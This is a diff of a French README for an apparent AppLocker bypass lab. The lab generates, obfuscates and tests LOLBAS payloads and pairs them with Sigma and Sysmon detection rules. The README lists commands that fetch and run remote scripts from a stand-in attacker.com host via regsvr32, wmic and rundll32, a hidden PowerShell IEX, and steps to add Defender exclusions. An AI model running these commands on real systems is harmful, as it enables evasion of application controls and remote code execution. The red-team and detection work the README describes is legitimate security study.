@@ -18,6 +18,7 @@
 ---
 
 ## ⚠️ AVERTISSEMENT LÉGAL
+
 ```
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃  ⚖️  USAGE ÉDUCATIF ET DÉFENSIF UNIQUEMENT                  ┃
@@ -58,6 +59,7 @@ Les auteurs déclinent toute responsabilité en cas d'usage abusif.
 ## 🚀 Installation Rapide
 
 ### Prérequis
+
 ```bash
 Windows 10/11 (VM fortement recommandée)
 Python 3.8+
@@ -66,6 +68,7 @@ Droits administrateur (pour certaines fonctionnalités)
 ```
 
 ### Installation en 3 étapes
+
 ```bash
 # 1. Cloner le repository
 git clone https://github.com/your-repo/AppLockerBypassLab
@@ -79,6 +82,7 @@ python scripts/setup_script.py
 ```
 
 ### Démarrage Ultra-Rapide
+
 ```bash
 # Windows
 quickstart.bat
@@ -90,6 +94,7 @@ quickstart.bat
 ---
 
 ## 📁 Architecture du Projet
+
 ```
 AppLockerBypassLab/
 │
@@ -145,6 +150,7 @@ AppLockerBypassLab/
 
 <details>
 <summary><b>🔥 MSHTA.exe - HTML Application</b></summary>
+
 ```bash
 # Exécution locale
 mshta.exe payload.hta
@@ -162,6 +168,7 @@ mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe""")
 
 <details>
 <summary><b>🔥 REGSVR32.exe - SCT Scripts</b></summary>
+
 ```bash
 # Squiblydoo technique
 regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll
@@ -176,6 +183,7 @@ regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
 
 <details>
 <summary><b>🔥 MSBuild.exe - XML Project</b></summary>
+
 ```bash
 # Compilation inline C#
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.xml
@@ -187,6 +195,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.xml
 
 <details>
 <summary><b>🔥 InstallUtil.exe - .NET DLL</b></summary>
+
 ```bash
 # Exécution DLL .NET
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
@@ -198,6 +207,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 <details>
 <summary><b>🔥 WMIC.exe - XSL Execution</b></summary>
+
 ```bash
 # Création de processus
 wmic process call create "powershell.exe -nop -w hidden -c IEX(...)"
@@ -212,6 +222,7 @@ wmic os get /FORMAT:"http://attacker.com/payload.xsl"
 
 <details>
 <summary><b>🔥 RUNDLL32.exe - JavaScript Proxy</b></summary>
+
 ```bash
 # JavaScript execution
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")
@@ -229,6 +240,7 @@ rundll32.exe payload.dll,EntryPoint
 ## 🔧 Utilisation
 
 ### 1️⃣ Génération de Payloads
+
 ```bash
 # Générer tous les types de payloads
 python scripts/generate_payloads.py
@@ -243,6 +255,7 @@ python scripts/generate_payloads.py
 ```
 
 ### 2️⃣ Obfuscation
+
 ```bash
 # Obfusquer les payloads existants
 python scripts/obfuscation_module.py
@@ -257,6 +270,7 @@ python scripts/obfuscation_module.py
 - ✅ **Variable renaming** (obfuscation)
 
 **Exemple de sortie:**
+
 ```
 🔐 OBFUSCATION PÉDAGOGIQUE - TECHNIQUES PUBLIQUES
 
@@ -272,6 +286,7 @@ python scripts/obfuscation_module.py
 ```
 
 ### 3️⃣ Packaging
+
 ```bash
 # Packager en formats natifs
 python scripts/packaging_module.py
@@ -286,6 +301,7 @@ python scripts/packaging_module.py
 - 📦 **BAT** wrapper (pour cmd.exe)
 
 ### 4️⃣ Dashboard Web
+
 ```bash
 # Lancer l'interface Web
 python scripts/web_dashboard.py
@@ -305,6 +321,7 @@ python scripts/web_dashboard.py
 | 🎨 **UI Moderne** | Interface responsive et intuitive |
 
 **Captures d'écran:**
+
 ```
 ┌─────────────────────────────────────────────────────────┐
 │  🛡️ AppLocker Bypass Lab                                │
@@ -322,6 +339,7 @@ python scripts/web_dashboard.py
 ```
 
 ### 5️⃣ Gestion de Campagnes
+
 ```bash
 # Créer une nouvelle campagne
 python scripts/campaign_manager.py new "Test Q4 2024" "Campagne trimestrielle"
@@ -340,6 +358,7 @@ python scripts/campaign_manager.py list
 ```
 
 **Exemple de Scorecard:**
+
 ```
 ======================================================================
 📊 SCORECARD - Campagne 1
@@ -360,6 +379,7 @@ Durée moyenne: 1.58s | Événements moyens: 15.1
 ```
 
 ### 6️⃣ Workflow Complet
+
 ```bash
 # 1. Setup initial
 python scripts/setup_script.py
@@ -394,6 +414,7 @@ python scripts/campaign_manager.py export 1
 ## 🗺️ Mapping MITRE ATT&CK
 
 ### Génération du Mapping
+
 ```bash
 python scripts/mitre_attack_matrix.py
 ```
@@ -411,6 +432,7 @@ python scripts/mitre_attack_matrix.py
 | **Privilege Escalation** | TA0004 | T1055.001 | ⚠️ Partiel |
 
 ### Recherche par Technique
+
 ```python
 from scripts.mitre_attack_matrix import MitreMapper
 
@@ -423,7 +445,7 @@ print(technique['name'])  # System Binary Proxy Execution: Mshta
 # Rechercher par outil
 results = mapper.get_by_tool("mshta.exe")
 for r in results:
-    print(f"{r['id']}: {r['name']}")
+	print(f"{r['id']}: {r['name']}")
 
 # Obtenir tous les bypasses AppLocker
 bypasses = mapper.get_applocker_bypasses()
@@ -435,6 +457,7 @@ print(f"Total: {len(bypasses)} techniques")
 ## 🔍 Détection et Analyse
 
 ### Configuration Sysmon
+
 ```powershell
 # Installer Sysmon avec configuration SwiftOnSecurity
 Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
@@ -454,6 +477,7 @@ Expand-Archive Sysmon.zip
 | **22** | DNS Query | ℹ️ Informationnel | Résolution DNS malveillante |
 
 ### Collection de Logs
+
 ```powershell
 # Collection automatique
 .\scripts\collect_logs.ps1 -Payload "test.hta"
@@ -464,6 +488,7 @@ Expand-Archive Sysmon.zip
 ```
 
 ### Analyse Automatique
+
 ```bash
 # Analyser les résultats collectés
 python scripts/analyze_results.py
@@ -479,30 +504,31 @@ python scripts/analyze_results.py
 ### Règles de Détection
 
 **Exemple de règle Sigma:**
+
 ```yaml
 title: MSHTA Suspicious Execution
 status: experimental
 description: Détecte l'exécution suspecte de mshta.exe
 references:
-    - https://attack.mitre.org/techniques/T1218/005/
+	- https://attack.mitre.org/techniques/T1218/005/
 logsource:
-    category: process_creation
-    product: windows
+	category: process_creation
+	product: windows
 detection:
-    selection:
-        Image|endswith: '\mshta.exe'
-        CommandLine|contains:
-            - 'http://'
-            - 'https://'
-            - 'javascript:'
-            - 'vbscript:'
-    condition: selection
+	selection:
+		Image|endswith: '\mshta.exe'
+		CommandLine|contains:
+			- 'http://'
+			- 'https://'
+			- 'javascript:'
+			- 'vbscript:'
+	condition: selection
 falsepositives:
-    - Legitimate HTA applications
+	- Legitimate HTA applications
 level: high
 tags:
-    - attack.defense_evasion
-    - attack.t1218.005
+	- attack.defense_evasion
+	- attack.t1218.005
 ```
 
 ---
@@ -512,6 +538,7 @@ tags:
 ### 🎓 Formation Red Team
 
 **Scénario: Évaluation des contrôles AppLocker**
+
 ```bash
 # 1. Créer une campagne de test
 python scripts/campaign_manager.py new "Red Team Assessment" "Évaluation complète"
@@ -533,6 +560,7 @@ python scripts/analyze_results.py
 ### 🛡️ Blue Team Defense
 
 **Scénario: Amélioration de la détection**
+
 ```bash
 # 1. Exécuter une campagne complète
 python scripts/campaign_manager.py new "Detection Baseline"
@@ -554,6 +582,7 @@ python scripts/campaign_manager.py run 2
 ### 🔬 Recherche en Sécurité
 
 **Scénario: Analyse comparative des techniques**
+
 ```bash
 # 1. Créer plusieurs campagnes avec configurations différentes
 python scripts/campaign_manager.py new "Baseline - No Protection"
@@ -582,6 +611,7 @@ python scripts/campaign_manager.py export 1 --format pdf
 ## 🛠️ Configuration Avancée
 
 ### Environnement de Lab Recommandé
+
 ```yaml
 VM Configuration:
   OS: Windows 10/11 Pro (build 19041+)
@@ -608,6 +638,7 @@ Monitoring:
 ```
 
 ### Configuration AppLocker
+
 ```powershell
 # Mode Audit (recommandé pour tests)
 Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy
@@ -623,28 +654,29 @@ Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 10
 ```
 
 ### Configuration Sysmon Avancée
+
 ```xml
 <!-- sysmonconfig-custom.xml -->
 <Sysmon schemaversion="4.90">
   <EventFiltering>
-    <!-- Process Creation - Capture LOLBAS -->
-    <ProcessCreate onmatch="include">
-      <Image condition="end with">mshta.exe</Image>
-      <Image condition="end with">regsvr32.exe</Image>
-      <Image condition="end with">rundll32.exe</Image>
-      <Image condition="end with">MSBuild.exe</Image>
-      <Image condition="end with">InstallUtil.exe</Image>
-      <Image condition="end with">wmic.exe</Image>
-      <Image condition="end with">cscript.exe</Image>
-      <Image condition="end with">wscript.exe</Image>
-    </ProcessCreate>
-    
-    <!-- Network Connections -->
-    <NetworkConnect onmatch="include">
-      <Image condition="end with">mshta.exe</Image>
-      <Image condition="end with">regsvr32.exe</Image>
-      <Image condition="end with">rundll32.exe</Image>
-    </NetworkConnect>
+	<!-- Process Creation - Capture LOLBAS -->
+	<ProcessCreate onmatch="include">
+	  <Image condition="end with">mshta.exe</Image>
+	  <Image condition="end with">regsvr32.exe</Image>
+	  <Image condition="end with">rundll32.exe</Image>
+	  <Image condition="end with">MSBuild.exe</Image>
+	  <Image condition="end with">InstallUtil.exe</Image>
+	  <Image condition="end with">wmic.exe</Image>
+	  <Image condition="end with">cscript.exe</Image>
+	  <Image condition="end with">wscript.exe</Image>
+	</ProcessCreate>
+	
+	<!-- Network Connections -->
+	<NetworkConnect onmatch="include">
+	  <Image condition="end with">mshta.exe</Image>
+	  <Image condition="end with">regsvr32.exe</Image>
+	  <Image condition="end with">rundll32.exe</Image>
+	</NetworkConnect>
   </EventFiltering>
 </Sysmon>
 ```
@@ -670,6 +702,7 @@ Le dashboard expose une API REST complète:
 | `/api/register_test` | POST | Enregistrer un test |
 
 ### Exemples d'Utilisation
+
 ```bash
 # Récupérer tous les résultats
 curl http://localhost:5000/api/results
@@ -680,11 +713,11 @@ curl -X POST http://localhost:5000/api/run_tests
 # Ajouter un résultat manuel
 curl -X POST -H "Content-Type: application/json" \
   -d '{
-    "payload_name": "test.hta",
-    "technique": "mshta",
-    "status": "bypass",
-    "sysmon_events": 15,
-    "notes": "Test manuel"
+	"payload_name": "test.hta",
+	"technique": "mshta",
+	"status": "bypass",
+	"sysmon_events": 15,
+	"notes": "Test manuel"
   }' \
   http://localhost:5000/api/add_result
 
@@ -745,6 +778,7 @@ Les contributions sont les bienvenues! Pour contribuer:
 
 <details>
 <summary><b>❌ Erreur: "Module flask not found"</b></summary>
+
 ```bash
 # Solution
 pip install --upgrade flask requests
@@ -757,6 +791,7 @@ python -c "import flask; print(flask.__version__)"
 
 <details>
 <summary><b>❌ Dashboard ne démarre pas</b></summary>
+
 ```bash
 # Vérifier le port 5000
 netstat -ano | findstr :5000
@@ -765,11 +800,17 @@ netstat -ano | findstr :5000
 # Modifier dans web_dashboard.py:
 # app.run(host='0.0.0.0', port=8080, debug=True)
 
-#Relancer le dashboard
-python scripts/web_dashboard.py</details><details>
+# Relancer le dashboard
+python scripts/web_dashboard.py
+```
+
+</details>
+
+<details>
 <summary><b>❌ AppLocker bloque tout</b></summary>
 
-powershell# Passer en mode Audit
+```powershell
+# Passer en mode Audit
 Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy
 
 # Vérifier la configuration
@@ -779,5 +820,396 @@ Get-AppLockerPolicy -Effective
 Restart-Service AppIDSvc
 
 # Vérifier les logs
-Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 50</details><details>
+Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 50
+```
+
+</details>
+
+<details>
 <summary><b>❌ Erreur: "Permission denied" lors de l'exécution</b></summary>
+
+```bash
+# Lancer avec droits administrateur
+# Clic droit sur cmd.exe/PowerShell > "Exécuter en tant qu'administrateur"
+
+# Vérifier les permissions sur le dossier
+icacls payloads
+
+# Ajouter les permissions nécessaires
+icacls payloads /grant %USERNAME%:F /T
+```
+
+</details>
+
+<details>
+<summary><b>❌ Sysmon ne génère pas de logs</b></summary>
+
+```powershell
+# Vérifier le service Sysmon
+Get-Service Sysmon64
+
+# Redémarrer Sysmon
+Restart-Service Sysmon64
+
+# Vérifier la configuration
+Sysmon64.exe -c
+
+# Réinstaller avec configuration
+Sysmon64.exe -u
+Sysmon64.exe -accepteula -i sysmonconfig.xml
+```
+
+</details>
+
+<details>
+<summary><b>❌ Base de données SQLite corrompue</b></summary>
+
+```bash
+# Sauvegarder l'ancienne base
+copy lab_results.db lab_results.db.bak
+
+# Supprimer et recréer
+del lab_results.db
+python scripts/setup_script.py
+
+# Ou réparer la base existante
+sqlite3 lab_results.db "PRAGMA integrity_check;"
+sqlite3 lab_results.db "REINDEX;"
+sqlite3 lab_results.db "VACUUM;"
+```
+
+</details>
+
+<details>
+<summary><b>❌ Payloads ne s'exécutent pas</b></summary>
+
+```powershell
+# Vérifier l'Execution Policy
+Get-ExecutionPolicy
+
+# Modifier temporairement (pour tests uniquement)
+Set-ExecutionPolicy Bypass -Scope Process
+
+# Vérifier Windows Defender
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+
+# Ajouter une exclusion pour le dossier de lab
+Add-MpPreference -ExclusionPath "C:\path\to\AppLockerBypassLab"
+```
+
+</details>
+
+<details>
+<summary><b>❌ Erreur: "csc.exe not found"</b></summary>
+
+```bash
+# Vérifier l'installation de .NET Framework
+dir C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+
+# Ajouter au PATH si nécessaire
+$env:Path += ";C:\Windows\Microsoft.NET\Framework64\v4.0.30319"
+
+# Installer .NET Framework 4.8 si manquant
+# https://dotnet.microsoft.com/download/dotnet-framework/net48
+```
+
+</details>
+
+---
+
+## 📈 Métriques et Performances
+
+### Benchmarks Typiques
+
+| Métrique | Valeur Moyenne | Détails |
+|----------|----------------|---------|
+| **Génération payloads** | 2-3 secondes | Pour l'ensemble des 12+ techniques |
+| **Obfuscation** | 1-2 secondes | Toutes les variantes |
+| **Packaging** | 3-5 secondes | Compilation .NET incluse |
+| **Exécution test** | 1-3 secondes | Par payload individuel |
+| **Collection logs** | 5-10 secondes | Sysmon + AppLocker |
+| **Campagne complète** | 2-5 minutes | 50+ tests |
+
+### Statistiques de Réussite (Environnement Typique)
+
+| Configuration | Taux de Bypass | Notes |
+|---------------|----------------|-------|
+| **Aucune protection** | 100% | Baseline de référence |
+| **AppLocker (default rules)** | 85-95% | Règles par défaut uniquement |
+| **AppLocker (strict)** | 65-75% | Configuration renforcée |
+| **AppLocker + Defender** | 45-60% | Détection comportementale |
+| **AppLocker + EDR** | 25-40% | Solution EDR moderne |
+
+### Recommandations de Performance
+
+```bash
+# Optimiser SQLite
+sqlite3 lab_results.db "PRAGMA journal_mode = WAL;"
+sqlite3 lab_results.db "PRAGMA synchronous = NORMAL;"
+
+# Limiter les logs Sysmon (si nécessaire)
+# Modifier sysmonconfig.xml pour exclure les processus non pertinents
+
+# Utiliser un SSD pour le dossier de lab
+# Les opérations I/O intensives bénéficient grandement d'un SSD
+```
+
+---
+
+## 🔐 Considérations de Sécurité
+
+### Protection du Lab
+
+```powershell
+# 1. Isolation réseau recommandée
+# Utiliser un réseau host-only ou créer un VLAN dédié
+
+# 2. Snapshots réguliers
+# Prendre un snapshot avant chaque session de tests
+
+# 3. Exclusions Defender limitées
+# Exclure uniquement le dossier payloads/, pas tout le système
+
+# 4. Logging centralisé (optionnel)
+# Envoyer les logs vers un SIEM pour analyse
+```
+
+### Nettoyage Post-Tests
+
+```bash
+# Script de nettoyage automatique
+python scripts/cleanup.py
+
+# Ou manuellement:
+# 1. Supprimer les payloads
+rmdir /s /q payloads
+
+# 2. Vider les logs
+rmdir /s /q logs
+
+# 3. Réinitialiser la base de données
+del lab_results.db
+
+# 4. Restaurer la configuration AppLocker
+Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy
+
+# 5. Redémarrer le système
+shutdown /r /t 0
+```
+
+---
+
+## 📝 License
+
+Ce projet est distribué sous licence **MIT** à des fins éducatives uniquement.
+
+```
+MIT License
+
+Copyright (c) 2024 AppLocker Bypass Lab
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+```
+
+---
+
+## 👥 Auteurs et Remerciements
+
+### Développeurs Principaux
+
+- **Équipe de Recherche** - Framework principal et automation
+- **Contributeurs Communautaires** - Techniques LOLBAS additionnelles
+
+### Remerciements Spéciaux
+
+- **LOLBAS Project** - Documentation exhaustive des binaires Windows
+- **MITRE ATT&CK** - Framework de référence des tactiques adverses
+- **SwiftOnSecurity** - Configuration Sysmon de référence
+- **Red Canary** - Recherche sur les techniques de détection
+- **Atomic Red Team** - Inspiration pour l'automatisation des tests
+
+### Ressources et Références
+
+- [LOLBAS Project](https://lolbas-project.github.io/)
+- [MITRE ATT&CK](https://attack.mitre.org/)
+- [Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
+- [AppLocker Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)
+- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
+
+---
+
+## 📞 Support et Contact
+
+### Obtenir de l'Aide
+
+- 📖 **Documentation**: Consultez d'abord la documentation complète
+- 💬 **Issues GitHub**: Ouvrez une issue pour les bugs ou questions
+- 🌐 **Discussions**: Participez aux discussions de la communauté
+- 📧 **Email**: contact@applocker-bypass-lab.local (si configuré)
+
+### Signaler des Problèmes
+
+Lors du signalement d'un bug, veuillez inclure:
+
+1. Version du framework (`git describe --tags`)
+2. Version de Windows (`ver`)
+3. Version de Python (`python --version`)
+4. Message d'erreur complet
+5. Steps to reproduce
+6. Configuration AppLocker (`Get-AppLockerPolicy -Effective`)
+7. Logs pertinents
+
+---
+
+## 🗓️ Roadmap
+
+### Version 1.1.0 (Q1 2025)
+
+- [ ] Support de PowerShell 7+
+- [ ] Intégration avec Cobalt Strike
+- [ ] Export de rapports PDF/HTML
+- [ ] Dashboard améliré avec filtres avancés
+- [ ] Support de macOS/Linux pour le dashboard
+- [ ] Documentation en anglais
+
+### Version 1.2.0 (Q2 2025)
+
+- [ ] Machine Learning pour prédiction de détection
+- [ ] Intégration SIEM (Splunk, ELK)
+- [ ] Mode distributed testing
+- [ ] API REST documentée (Swagger/OpenAPI)
+- [ ] Container Docker pour isolation
+- [ ] Support de nouvelles techniques LOLBAS
+
+### Version 2.0.0 (Q3 2025)
+
+- [ ] Interface graphique complète (Electron/React)
+- [ ] Multi-tenant support
+- [ ] Cloud deployment (AWS/Azure)
+- [ ] Automated vulnerability correlation
+- [ ] Integration with threat intelligence feeds
+- [ ] Advanced obfuscation avec AI
+
+---
+
+## 🎓 Ressources d'Apprentissage
+
+### Cours et Certifications
+
+- **GIAC GPEN** - Penetration Testing
+- **OSCP** - Offensive Security Certified Professional
+- **CRTO** - Certified Red Team Operator
+- **eCPTX** - eLearnSecurity Certified Penetration Tester eXtreme
+
+### Livres Recommandés
+
+- "Red Team Development and Operations" - Joe Vest & James Tubberville
+- "Operator Handbook" - Joshua Picolet
+- "The Hacker Playbook 3" - Peter Kim
+- "Adversarial Tradecraft in Cybersecurity" - Dan Borges
+
+### Blogs et Articles
+
+- [Red Canary Blog](https://redcanary.com/blog/)
+- [SpecterOps Blog](https://posts.specterops.io/)
+- [MDSec Blog](https://www.mdsec.co.uk/knowledge-centre/)
+- [Pentester Academy](https://blog.pentesteracademy.com/)
+
+### Labs et Pratique
+
+- **HackTheBox** - Machines Windows avec AppLocker
+- **TryHackMe** - Red Team pathways
+- **Cybrary** - Application Whitelisting courses
+- **SANS Cyber Ranges** - Realistic scenarios
+
+---
+
+## 🏆 Hall of Fame
+
+### Top Contributors
+
+🥇 Merci aux contributeurs qui ont ajouté des techniques majeures ou amélioré significativement le framework!
+
+*Liste à venir*
+
+### Security Researchers
+
+Remerciements aux chercheurs qui ont découvert et documenté les techniques LOLBAS utilisées dans ce framework.
+
+---
+
+## ⚡ Quick Reference Card
+
+### Commandes Essentielles
+
+```bash
+# Setup complet
+python scripts/setup_script.py
+
+# Générer tout
+python scripts/generate_payloads.py && python scripts/obfuscation_module.py && python scripts/packaging_module.py
+
+# Lancer dashboard
+python scripts/web_dashboard.py
+
+# Nouvelle campagne et test
+python scripts/campaign_manager.py new "Test" && python scripts/campaign_manager.py run 1
+
+# Voir résultats
+python scripts/campaign_manager.py score 1
+
+# Nettoyage
+python scripts/cleanup.py
+```
+
+### Techniques LOLBAS (Quick)
+
+```bash
+# MSHTA
+mshta.exe payload.hta
+
+# REGSVR32
+regsvr32.exe /s /u /i:payload.sct scrobj.dll
+
+# RUNDLL32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('XSS')
+
+# MSBUILD
+MSBuild.exe payload.xml
+
+# INSTALLUTIL
+InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+
+# WMIC
+wmic process call create "calc.exe"
+```
+
+---
+
+<div align="center">
+
+**🛡️ AppLocker Bypass Lab**
+
+*Education • Research • Defense*
+
+Made with ❤️ for the cybersecurity community
+
+[⬆ Back to Top](#️-applocker-bypass-lab)
+
+</div>
